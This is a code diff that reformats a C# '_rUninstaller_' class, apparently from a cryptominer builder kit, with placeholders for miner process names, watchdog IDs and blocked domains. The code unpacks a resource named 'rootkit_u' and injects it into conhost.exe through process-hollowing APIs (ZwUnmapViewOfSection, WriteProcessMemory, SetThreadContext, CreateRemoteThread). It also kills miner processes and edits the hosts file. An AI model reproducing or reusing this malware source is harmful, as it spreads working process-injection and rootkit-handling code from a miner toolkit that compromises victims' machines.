@@ -24,22 +24,14 @@ public partial class _rUninstaller_
         try
         {
             using (var archive = new ZipArchive(new MemoryStream(GetTheResource("rootkit_u"))))
-            {
                 foreach (ZipArchiveEntry entry in archive.Entries)
-                {
                     if (entry.FullName.Contains("st"))
-                    {
                         using (var streamdata = entry.Open())
+                        using (var ms = new MemoryStream())
                         {
-                            using (var ms = new MemoryStream())
-                            {
-                                streamdata.CopyTo(ms);
-                                Inject(ms.ToArray(), Path.Combine(Directory.GetParent(Environment.SystemDirectory).FullName, "System32\\conhost.exe"), "");
-                            }
+                            streamdata.CopyTo(ms);
+                            Inject(ms.ToArray(), Path.Combine(Directory.GetParent(Environment.SystemDirectory).FullName, "System32\\conhost.exe"), "");
                         }
-                    }
-                }
-            }  
         }
         catch { }
 #endif
@@ -48,7 +40,6 @@ public partial class _rUninstaller_
         try
         {
             Command("cmd", "#REGREM");
-
         }
         catch {}
 
@@ -70,21 +61,15 @@ public partial class _rUninstaller_
             var _rarg3_ = new ManagementObjectSearcher(_rarg2_, new ObjectQuery("Select CommandLine, ProcessID from Win32_Process")).Get();
             string[] minerset = new string[] { $FINDSET };
             foreach (ManagementObject MemObj in _rarg3_)
-            {
                 if (MemObj != null && MemObj["CommandLine"] != null && (minerset.Any(MemObj["CommandLine"].ToString().Contains) || MemObj["CommandLine"].ToString().Contains(" #WATCHDOGID")))
-                {
                     pids.Add(Convert.ToInt32(MemObj["ProcessID"]));
-                }
-            }
 
 #if DefProcessProtect
             UnProtect(pids.ToArray());
 #endif
-            
-            foreach(int pid in pids)
-            {
+
+            foreach (int pid in pids)
                 Command("cmd", string.Format("/c taskkill /f /PID \"{0}\"", pid));
-            }
         }
         catch { }
 
@@ -106,16 +91,13 @@ public partial class _rUninstaller_
 
             string[] domainset = new string[] { $CSDOMAINSET };
             for (int i = hostscontent.Count - 1; i >= 0; i--)
-            {
                 foreach (string set in domainset)
-                {
                     if (hostscontent[i].Contains(set))
                     {
                         hostscontent.RemoveAt(i);
                         break;
                     }
-                }
-            }
+
             File.WriteAllLines(hostspath, hostscontent.ToArray());
         }
         catch { }
@@ -147,51 +129,25 @@ public partial class _rUninstaller_
     }
 
     [DllImport("kernel32.dll")]
-    private static extern bool CreateProcess(string lpApplicationName,
-                                         string lpCommandLine,
-                                         IntPtr lpProcessAttributes,
-                                         IntPtr lpThreadAttributes,
-                                         bool bInheritHandles,
-                                         uint dwCreationFlags,
-                                         IntPtr lpEnvironment,
-                                         string lpCurrentDirectory,
-                                         byte[] lpStartupInfo,
-                                         byte[] lpProcessInformation);
+    private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, byte[] lpStartupInfo, byte[] lpProcessInformation);
 
     [DllImport("kernel32.dll")]
-    private static extern long VirtualAllocEx(long hProcess,
-                                              long lpAddress,
-                                              long dwSize,
-                                              uint flAllocationType,
-                                              uint flProtect);
+    private static extern long VirtualAllocEx(long hProcess, long lpAddress, long dwSize, uint flAllocationType, uint flProtect);
 
     [DllImport("kernel32.dll")]
-    private static extern long WriteProcessMemory(long hProcess,
-                                                  long lpBaseAddress,
-                                                  byte[] lpBuffer,
-                                                  int nSize,
-                                                  long written);
+    private static extern long WriteProcessMemory(long hProcess, long lpBaseAddress, byte[] lpBuffer, int nSize, long written);
 
     [DllImport("ntdll.dll")]
-    private static extern uint ZwUnmapViewOfSection(long ProcessHandle,
-                                                    long BaseAddress);
+    private static extern uint ZwUnmapViewOfSection(long ProcessHandle, long BaseAddress);
 
     [DllImport("kernel32.dll")]
-    public static extern uint CreateRemoteThread(long hProcess,
-                                                IntPtr lpThreadAttributes,
-                                                uint dwStackSize,
-                                                long lpStartAddress,
-                                                long lpParameter,
-                                                uint dwCreationFlags,
-                                                out IntPtr lpThreadId);
+    public static extern uint CreateRemoteThread(long hProcess, IntPtr lpThreadAttributes, uint dwStackSize, long lpStartAddress, long lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);
 
     [DllImport("kernel32.dll")]
-    private static extern bool SetThreadContext(long hThread,
-                                                IntPtr lpContext);
+    private static extern bool SetThreadContext(long hThread, IntPtr lpContext);
 
     [DllImport("kernel32.dll")]
-    private static extern bool GetThreadContext(long hThread,
-                                                IntPtr lpContext);
+    private static extern bool GetThreadContext(long hThread, IntPtr lpContext);
 
     [DllImport("kernel32.dll")]
     private static extern uint ResumeThread(long hThread);
